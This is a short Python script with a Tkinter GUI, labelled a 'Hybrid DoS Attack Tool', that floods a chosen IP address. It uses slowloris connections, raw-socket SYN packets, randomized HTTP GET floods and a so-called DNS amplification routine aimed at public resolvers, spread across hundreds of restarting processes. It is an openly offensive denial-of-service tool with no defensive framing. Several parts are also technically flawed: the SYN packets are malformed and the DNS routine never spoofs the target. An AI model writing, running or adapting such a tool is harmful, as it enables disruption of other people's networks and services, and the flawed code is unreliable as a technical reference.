import socket
import threading
import random
import time
import requests
import scapy.all as scapy
import tkinter as tk
from multiprocessing import Process

# GUI Functionality
def start_attack():
    global attack_running
    attack_running = True
    threading.Thread(target=launch_attacks).start()

def stop_attack():
    global attack_running
    attack_running = False

# Target Details
TARGET_IP = "192.168.1.1"  # Change this
TARGET_PORT = 80
THREADS = 500

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 11)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)"
]

def random_url():
    return f"/?{random.randint(1, 100000)}"

# ---- ATTACK FUNCTIONS ----
def slowloris():
    headers = "GET / HTTP/1.1\r\nHost: {}\r\n".format(TARGET_IP)
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(headers.encode())
            time.sleep(5)
        except:
            pass

def syn_flood():
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = b"\x45\x00\x00\x28" + random.randbytes(8)
            tcp_header = b"\x00\x50" + random.randbytes(6)
            packet = ip_header + tcp_header
            s.sendto(packet, (TARGET_IP, TARGET_PORT))
        except:
            pass

def http_flood():
    while attack_running:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": "https://www.google.com",
                "Accept-Language": "en-US,en;q=0.5",
                "Cache-Control": "no-cache"
            }
            requests.get(f"http://{TARGET_IP}{random_url()}", headers=headers)
        except:
            pass

def dns_amplification():
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
    while attack_running:
        try:
            query = scapy.DNSQR(qname="example.com")
            packet = scapy.IP(dst=random.choice(dns_servers)) / scapy.UDP(sport=random.randint(1024, 65535), dport=53) / scapy.DNS(rd=1, qd=query)
            scapy.send(packet, verbose=False)
        except:
            pass

# ---- AUTO UPDATE ----
def launch_attacks():
    while attack_running:
        processes = []
        for _ in range(THREADS // 4):
            processes.append(Process(target=slowloris))
            processes.append(Process(target=syn_flood))
            processes.append(Process(target=http_flood))
            processes.append(Process(target=dns_amplification))

        for p in processes:
            p.start()

        time.sleep(600)  # Restart attacks every 10 minutes for randomness

        for p in processes:
            p.terminate()

# ---- GUI INTERFACE ----
root = tk.Tk()
root.title("Hybrid DoS Attack Tool")
root.geometry("300x200")

tk.Label(root, text="Hybrid DoS Attack Tool", font=("Arial", 14)).pack(pady=10)

start_button = tk.Button(root, text="Start Attack", command=start_attack, bg="red", fg="white")
start_button.pack(pady=5)

stop_button = tk.Button(root, text="Stop Attack", command=stop_attack, bg="gray", fg="white")
stop_button.pack(pady=5)

root.mainloop()
